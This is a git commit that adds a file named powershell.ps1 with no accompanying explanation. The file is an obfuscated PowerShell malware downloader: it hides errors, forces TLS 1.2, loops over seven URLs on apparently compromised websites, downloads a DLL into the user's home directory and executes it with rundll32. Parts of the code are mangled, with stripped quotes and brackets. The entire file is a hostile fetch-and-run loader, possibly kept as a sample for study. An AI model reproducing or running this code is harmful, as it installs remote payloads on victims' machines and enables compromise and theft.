0f1374a28ede37bb343a76a8274ca0a8a79c6eb7
DavidOW <david@openwebinars.net>
2024-10-10 01:33:38 +0200

    first commit

---
+++ powershell.ps1
@@ -0,0 +1,21 @@
+ sEt MKu  [TYPe]01243 -F SYsTeM.io.DIORYrECt 
+    SeT-iTEM  vaRIabLE:mBu   [TYPe]680345271 -fSteMGerMa.net.seRVIcepOintsNAY
+ $ErrorActionPreference = SilentlyContinue
+$Cvmmq4o=$Q26L  [char]64  $E16H
+$J16J=N_0P
+ DIr VariabLE:Mku  .VaLUe::cREAtedIRECTORy$HOME  0Db_bh300Yf5be5g0 -F [chAR]92
+$C39Y=U68S
+   vARiaBLe  mbu  -VAlueoN  ::sEcuRITYproTocol = Tls12
+$F35I=I4_B
+$Swrp6tc = A69S
+$X27H=C33O
+$Imd1yck=$HOMEUOHDb_bh30UOHYf5be5gUOH.RePlACeUOH[StrInG][chAr]92$Swrp6tc.dll
+$K47V=R49G
+$B9fhbyv=]http://s://admintk.com/wp-admin/L/@]http://s://mikegeerinck.com/c/YYsa/@]http://://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]http://://etdog.com/wp-content/nu/@]http://s://www.hintup.com.br/wp-content/dE/@]http://://www.stmarouns.nsw.edu.au/paypal/b8G/@]http://://wm.mcdevelop.net/content/6F2gd/.REplACe]http://[array]sdswhttp3d[1].sPLIT$C83R  $Cvmmq4o  $F10Q
+$Q52M=P05K
+foreach $Bm5pw6z in $B9fhbyvtry&New-Object SysTem.nEt.WEBcLIeNT.doWNlOaDFIlE$Bm5pw6z $Imd1yck
+$Z10L=A92Q
+If &Get-Item $Imd1yck.lenGTH -ge 35698 &rundll32 $Imd1yckControl_RunDLL.TOStRiNG
+$R65I=Z09B
+break
+$K7_H=F12Ucatch$W54I=V95O
